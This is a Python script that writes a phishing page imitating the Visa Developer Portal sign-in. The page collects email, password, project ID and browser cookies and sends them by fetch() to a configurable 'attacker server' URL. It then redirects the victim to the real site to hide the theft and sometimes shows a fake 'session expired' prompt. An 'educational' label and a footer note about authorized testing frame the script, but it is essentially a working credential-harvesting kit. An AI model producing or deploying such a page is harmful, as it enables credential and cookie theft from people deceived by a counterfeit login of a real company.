#!/usr/bin/env python3
"""
Visa Developer Portal Phishing Page Generator
Educational: understand phishing to defend against it.
"""
import os

def generate_visa_phish_page(attacker_url: str = "https://localhost:8080/collect", output_path: str = "visa_login.html"):
    """Generate a fake Visa Developer Portal login page."""
    
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Developer Portal - Sign In</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .login-container {{
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 400px;
            padding: 40px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .logo h1 {{
            color: #1a1a7e;
            font-size: 28px;
            font-weight: 700;
        }}
        .logo span {{
            color: #ffd700;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        label {{
            display: block;
            margin-bottom: 6px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }}
        input {{
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.3s;
        }}
        input:focus {{
            outline: none;
            border-color: #1a1a7e;
        }}
        button {{
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #1a1a7e 0%, #2d2d9e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }}
        button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(26, 26, 126, 0.4);
        }}
        .footer {{
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }}
        .footer a {{
            color: #1a1a7e;
            text-decoration: none;
        }}
        .error {{
            color: #dc3545;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }}
        .warning {{
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #856404;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>Visa<span>Developer</span></h1>
            <p style="color: #666; margin-top: 5px;">Portal Sign In</p>
        </div>
        
        <div class="warning" id="warning" style="display: none;">
            ⚠️ Your session has expired. Please sign in again.
        </div>
        
        <form id="loginForm" action="{attacker_url}" method="POST">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="form-group">
                <label for="project">Project ID (optional)</label>
                <input type="text" id="project" name="project" placeholder="e.g., proj_12345">
            </div>
            
            <p class="error" id="errorMsg">Invalid email or password. Please try again.</p>
            
            <button type="submit">Sign In</button>
        </form>
        
        <div class="footer">
            <p><a href="#">Forgot password?</a> | <a href="#">Create account</a></p>
            <p style="margin-top: 15px;">© 2026 Visa. All rights reserved.</p>
            <p style="margin-top: 5px; color: #999; font-size: 11px;">
                This page is for authorized security testing only.
            </p>
        </div>
    </div>
    
    <script>
        // Collect browser fingerprint
        function collectFingerprint() {{
            return {{
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${{screen.width}}x${{screen.height}}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            }};
        }}
        
        // Intercept form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const project = document.getElementById('project').value;
            const fingerprint = collectFingerprint();
            
            // Send to attacker server
            fetch('{attacker_url}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    email: email,
                    password: password,
                    project: project,
                    fingerprint: fingerprint,
                    source: 'visa_developer_portal'
                }})
            }})
            .then(response => {{
                if (response.ok) {{
                    // Show error and redirect to real portal
                    document.getElementById('errorMsg').style.display = 'block';
                    setTimeout(() => {{
                        window.location.href = 'https://developer.visa.com/';
                    }}, 2000);
                }}
            }})
            .catch(err => {{
                console.error('Exfil failed:', err);
            }});
        }});
        
        // Show warning on load
        window.onload = function() {{
            if (Math.random() > 0.5) {{
                document.getElementById('warning').style.display = 'block';
            }}
        }};
    </script>
</body>
</html>'''
    
    with open(output_path, 'w') as f:
        f.write(html)
    
    return {"page": output_path, "attacker_url": attacker_url, "status": "generated"}

if __name__ == "__main__":
    result = generate_visa_phish_page()
    print(f"[+] Phishing page: {result['page']}")
    print(f"[+] Target URL: {result['attacker_url']}")
